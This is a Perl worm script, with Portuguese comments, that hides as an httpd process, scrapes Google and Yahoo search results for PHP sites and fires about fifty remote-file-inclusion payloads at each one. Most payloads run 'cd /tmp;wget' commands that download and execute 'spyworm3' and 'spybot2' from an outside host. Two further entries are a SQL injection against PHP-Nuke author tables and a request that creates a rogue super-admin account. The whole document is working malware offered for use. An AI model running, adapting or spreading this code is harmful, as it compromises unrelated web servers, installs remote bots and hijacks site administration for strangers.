   #!/usr/bin/perl

   #####################
   ####
   ####  ####  #### #### ####  #### #### #  # #  # ####
   ####  #  #  #  # #    #  #  #    #    #  # # #  #
   ####  ####  #  # ###  ##    #### #    #### ##   ###
   ####  #     #  # #    # #      # #    #  # # #  #
   ####  #     #### #### #  #  #### #### #  # #  # ####
   ####



   use LWP::Simple;
   use IO::Socket::INET;





   my $processo = "/usr/local/sbin/httpd";
   $SIG{"INT"} = "IGNORE";
   $SIG{"HUP"} = "IGNORE";
   $SIG{"TERM"} = "IGNORE";
   $SIG{"CHLD"} = "IGNORE";
   $SIG{"PS"} = "IGNORE";

   $0="$processo"."\0"x16;;
   my $pid=fork;
   exit if $pid;
   die "Problema com o fork: $!" unless defined($pid);


   $lista[0] = '/modules/My_eGallery/public/displayCategory.php?basepath=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[1] = '/modules/mod_mainmenu.php?mosConfig_absolute_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[2] = '/include/new-visitor.inc.php?lvc_include_dir=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[3] = '/_functions.php?prefix=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[4] = '/cpcommerce/_functions.php?prefix=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[5] = '/modules/coppermine/themes/default/theme.php?THEME_DIR=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[6] = '/modules/agendax/addevent.inc.php?agendax_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[7] = '/ashnews.php?pathtoashnews=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[8] = '/eblog/blog.inc.php?xoopsConfig[xoops_url]=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[9] = '/pm/lib.inc.php?pm_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[10] = '/b2-tools/gm-2-b2.php?b2inc=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[11] = '/modules/mod_mainmenu.php?mosConfig_absolute_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[12] = '/modules/agendax/addevent.inc.php?agendax_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[13] = '/includes/include_once.php?include_file=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[14] = '/e107/e107_handlers/secure_img_render.php?p=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[15] = '/shoutbox/expanded.php?conf=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[16] = '/modules.php?name=NukeJokes&file=print&jokeid=-1/**/UNION/**/SELECT/**/aid,pwd/**/FROM/**/nuke_authors/**/WHERE/**/radminsuper=1/**/LIMIT/**/1/*';
   $lista[17] = '/admin.php?op=AddAuthor&add_aid=cake&add_name=God&add_pwd=brasnet&add_email=foo@bar.com&add_radminsuper=1&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox';
   $lista[18] = '/main.php?x=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[19] = '/myPHPCalendar/admin.php?cal_dir=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[20] = '/index.php/main.php?x=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[21] = '/index.php?include=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[22] = '/index.php?x=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[23] = '/index.php?open=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[24] = '/index.php?visualizar=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[25] = '/template.php?pagina=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[26] = '/index.php?pagina=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[27] = '/index.php?inc=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[28] = '/includes/include_onde.php?include_file=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[29] = '/index.php?page=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[30] = '/index.php?pg=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[31] = '/index.php?show=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[32] = '/index.php?cat=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[33] = '/index.php?file=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[34] = '/db.php?path_local=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[35] = '/index.php?site=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[36] = '/htmltonuke.php?filnavn=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[37] = '/livehelp/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[38] = '/hcl/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[39] = '/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[40] = '/support/faq/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[41] = '/help/faq/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[42] = '/helpcenter/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[43] = '/live-support/inc/pipe.php?HCL_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[44] = '/gnu3/index.php?doc=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[45] = '/gnu/index.php?doc=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[46] = '/phpgwapi/setup/tables_update.inc.php?appdir=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[47] = 'includes/calendar.php?phpc_root_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[48] = 'includes/setup.php?phpc_root_path=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[49] = '/inc/authform.inc.php?path_pre=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista[50] = '/include/authform.inc.php?path_pre=http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';


   while(1){

   ####################################
   #
   #  worm php injection
   #  explora várias vuls
   #
   #
   ####################################
   $nume = int rand(999);
    $procura = 'index.php?*=' .  $nume;


   $caxe = ".";
   $caxe1 = ".";
   $caxe .= rand(9999);
   $caxe1 .= rand(9999);
   $arq = ".";
   $arq .= int rand(9999);

   open(sites,">$arq");
   print sites "";
   close(sites);

   for($n=0;$n<900;$n += 100){
   $sock = IO::Socket::INET->new(PeerAddr => "www.google.com.br", PeerPort => 80, Proto => "tcp") or next;
   print $sock "GET /search?q=$procura&num=100&hl=pt-BR&lr=&as_qdr=all&start=$n&sa=N HTTP/1.0\n\n";
   @resu = <$sock>;
   close($sock);
   $ae = "@resu";
   while ($ae=~ m/<a href=.*?>.*?<\/a>/){
     $ae=~ s/<a href=(.*?)>.*?<\/a>/$1/;
     $uber=$1;
       if ($uber !~/translate/)
       {
       if ($uber !~ /cache/)
       {
       if ($uber !~ /"/)
       {
       if ($uber !~ /google/)
       {
       if ($uber !~ /216/)
       {
       if ($uber =~/http/)
       {
       if ($uber !~ /start=/)
       {
         open(arq,">>$arq");
             print arq "$uber\n";
             close(arq);
   }}}}}}}}}


   for($cadenu=1;$cadenu <= 991; $cadenu +=10){

   @cade = get("http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=1&b=$cadenu") or next;
   $ae = "@cade";

   while ($ae=~ m/<em class=yschurl>.*?<\/em>/){
     $ae=~ s/<em class=yschurl>(.*?)<\/em>/$1/;
     $uber=$1;

   $uber =~ s/ //g;
   $uber =~ s/<b>//g;
   $uber =~ s/<\/b>//g;
   $uber =~ s/<wbr>//g;
   open(a,">>$arq");
   print a "$uber\n";
   close(a);
   }}

   $ark = $arq;
   @si = "";
   open (arquivo,"<$ark");
   @si = <arquivo>;
   close(arquivo);
   $novo ="";
   foreach (@si){
   if (!$si{$_})
   {
   $novo .= $_;
   $si{$_} = 1;
   }
   }
   open (arquivo,">$ark");
   print arquivo $novo;
   close(arquivo);

   $a =0;
   $b =0;
   open(ae,"<$arq");
   while(<ae>)
    {$sites[$a] = $_;
     chomp $sites[$a];
     $a++;
     $b++;}
   close(ae);

   for ($a=0;$a<=$b;$a++){
   open (file, ">$caxe");
         print file "";
   close(file);
   open (file, ">$caxe1");
         print file "";
   close(file);
   $k=0;
   $e=0;
    $data=get($sites[$a]) or next;
     while($data=~ m/<a href=".*?">.*?<\/a>/){
     $data=~ s/<a href="(.*?)">.*?<\/a>/$1/;
     $ubersite=$1;

     if ($ubersite =~/"/)
      {
      $nu = index $ubersite, '"';
      $ubersite = substr($ubersite,0,$nu);
      }
   if ($ubersite !~/http/)
    {$ubersite = $sites[$a].'/'.$ubersite;}
   open(file,">>$caxe") || die("nao abriu caxe.txt $!");
   print file "$ubersite\n";
   close(file);
   }

   $lista1 = 'http://www.5wk.com/spy.gif?&cmd=cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2';
   $lista2 = '|cd /tmp;wget http://www.5wk.com/spyworm3;perl spyworm3;wget http://www.5wk.com/spybot2|';
   $t =0;
   $y =0;
   @ja;
   open(opa,"<$caxe") or next;
   while (<opa>)
   {
    $ja[$t] = $_;
    chomp $ja[$t];
    $t++;
    $y++;
   }
   close(opa);
   $t=1;
   while ($t < $y)
      {
       if ($ja[$t] =~/=/)
         {
          $num = rindex $ja[$t], '=';
          $num += 1;
          $ja[$t] = substr($ja[$t],0,$num);
               open (jaera,">>$caxe1") or next;
               print jaera "$ja[$t]$lista1\n";
               print jaera "$ja[$t]$lista2\n";
               close(jaera);
           $num = index $ja[$t], '=';
           $num += 1;
           $ja[$t] = substr($ja[$t],0,$num);
           $num1 = rindex $ja[$t], '.';
           $subproc = substr($ja[$t],$num1,$num);

               open (jaera,">>$caxe1") or next;
               print jaera "$ja[$t]$lista1\n";
               print jaera "$ja[$t]$lista2\n";
               close(jaera);
         }
        $t++;
        }
   $ark = "$caxe1";
   @si = "";
   open (arquivo,"<$ark");
   @si = <arquivo>;
   close(arquivo);
   $novo ="";
   foreach (@si){
   if (!$si{$_})
   {
   $novo .= $_;
   $si{$_} = 1;
   }
   }
   open (arquivo,">$ark");
   print arquivo $novo;
   close(arquivo);
       $q=0;
       $w=0;
        @hot;
       open (ops,"<$caxe1");
       while(<ops>)
       {
       $hot[$q] = $_;
       chomp $hot[$q];
       $q++;
       $w++;
       }
       close(ops);

   for($q=0;$q<=$w;$q++)
     {

     if ($hot[$q] =~/http/)
       {
       $tipo=get($hot[$q]) or next;
       for($tee=0;$tee<=50;$tee++){
       &recicla;
       $hot[$q] = 'http://' .$hot[$q] . $lista[$tee] ;
       $tipo=get($hot[$q]) or next;

       }





       }}}

   }







   ###############################
   #
   #  sub rotinas
   #
   #
   #
   ###############################



   #######################

   sub recicla{
       substr($hot[$q], 0, 7) ="";
           $nu = index $hot[$q], '/';
           $hot[$q] = substr($hot[$q],0,$nu);
   }
